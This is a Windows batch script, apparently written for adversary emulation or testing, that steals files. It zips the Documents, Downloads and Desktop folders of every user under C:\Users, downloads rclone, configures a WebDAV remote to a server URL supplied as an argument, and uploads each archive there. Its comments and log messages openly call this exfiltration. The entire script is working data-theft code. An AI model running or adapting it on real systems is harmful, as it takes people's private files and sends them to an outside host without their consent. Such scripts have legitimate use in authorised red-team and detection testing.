@ECHO off
@setlocal enabledelayedexpansion
set originalpwd=%cd%
set targetdir="%SYSTEMDRIVE%\Users"
set logfile="%cd%\Test1Log.txt"

:: Check that rclone server url is passed in
IF "%~1"=="" (
    ECHO [ERROR] Must include server URL as script argument
    EXIT /B
) ELSE (
    set server=%~1
)

:: Get target files
cd %targetdir%
ECHO [INFO] Searching for target files in C:\Users ... >> %logfile%
set numsuccessfulzips=0
FOR /F "tokens=*" %%d IN ('dir /b /a:d-l') DO (
    :: Enumerate and zip Documents, Downloads, & Desktop directories for each user
    set numarchives=0
    FOR %%b IN ("%cd%\%%d\Documents" "%cd%\%%d\Downloads" "%cd%\%%d\Desktop") DO (
        set commandline=tar.exe -a -c -f "%originalpwd%\%%d_archive!numarchives!.zip" %%b
        
        ECHO [DEBUG] Executing: !commandline! >> %logfile%
        (!commandline! >> %logfile% 2>&1 || type "%originalpwd%\%%d_archive!numarchives!.zip" 1>NUL 2>NUL) && (
            set createdzips[!numsuccessfulzips!]="%originalpwd%\%%d_archive!numarchives!.zip"
            set /A numsuccessfulzips=numsuccessfulzips+1
            ECHO [INFO] Created archive %originalpwd%\%%d_archive!numarchives!.zip >> %logfile%
        ) || ECHO [ERROR] Failed to zip %%b >> %logfile%
        set /A numarchives=numarchives+1
        TIMEOUT /T 30
    )
    ECHO [INFO] Created a total of !numsuccessfulzips! archives. >> %logfile%
)
cd %originalpwd%

:: Download and configure rclone
curl -O https://downloads.rclone.org/v1.66.0/rclone-v1.66.0-windows-amd64.zip 2>&1 && ECHO [INFO] rclone installed >> %logfile% || (
    ECHO [ERROR] Failed to install rclone >> %logfile%
    EXIT /B
)
(tar -xf rclone-v1.66.0-windows-amd64.zip 2>&1 && cd "rclone-v1.66.0-windows-amd64" || ECHO [ERROR] Failed to unzip rclone) >> %logfile%

set commandline=rclone config create webdav webdav url=%server% vendor=rclone 
ECHO [DEBUG] Executing: !commandline! >> %logfile%
(!commandline! 2>&1 && ECHO [INFO] Created rclone config webdav || ECHO [ERROR] Failed to configure rclone && EXIT /B) >> %logfile%

:: Exfiltrate via rclone
IF "!numsuccessfulzips!" EQU "0" (
    ECHO [INFO] No zip archives created. >> %logfile%
    GOTO :eof
)
set /A maxarchiveindex=numsuccessfulzips-1
FOR /L %%x IN (0,1,!maxarchiveindex!) DO (
    set archivepath=!createdzips[%%x]!
    set commandline=rclone copy !archivepath! webdav:

    ECHO [DEBUG] Executing: !commandline! >> %logfile%
    (!commandline! 2>&1 && ECHO [INFO] Archive %archivepath% exfiltrated via rclone || ECHO [ERROR] Failed to exfiltrate %archivepath%) >> %logfile%
)

:CONTINUE
REM
GOTO :eof

